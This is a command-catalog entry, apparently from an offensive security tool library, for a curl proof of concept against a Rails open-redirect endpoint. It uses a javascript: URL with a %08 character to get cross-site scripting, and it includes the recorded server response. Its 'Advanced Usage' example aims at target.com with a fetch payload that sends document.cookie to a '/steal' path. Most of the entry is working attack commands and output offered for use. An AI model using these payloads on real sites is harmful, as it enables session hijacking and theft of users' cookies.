---
id: cmd-curl-rails-poc
data: >-
  curl -v
  "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
tags:
  - xss
  - poc
  - web
type: command
output: >-
  HTTP/1.1 302 Found

  Cache-Control: no-store

  Date: Thu, 06 Apr 2023 05:16:21 GMT

  Connection: close

  Content-Length: 100


  <html><body>You are being <a href="javascript:alert(document.cookie)
  ">redirected</a>.</body></html>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.726Z'
verified: false
validated: true
submitted: true
---
# curl-rails-redirect-poc

## Command

```bash
curl -v "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
```

## Description

Sends a verbose GET request to a vulnerable Rails endpoint with a crafted redirect_url containing a JavaScript payload and %08 control character to demonstrate header stripping and XSS setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output to show headers | Yes |
| `redirect_url` | URL parameter with JS payload + %08 | Yes |

## Examples

### Basic Usage

```bash
curl -v "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
```

### Advanced Usage

```bash
curl -v -H "User-Agent: Mozilla/5.0" "http://target.com/vuln?redirect_url=javascript:fetch('/steal?cookie='+document.cookie)%08"
```

## Expected Output

Verbose headers showing 302 without Location, followed by HTML fallback with href set to the JS payload (partially escaped).

## Related

- [[Related Procedure|procedures/Send-Crafted-Redirect-Request]]
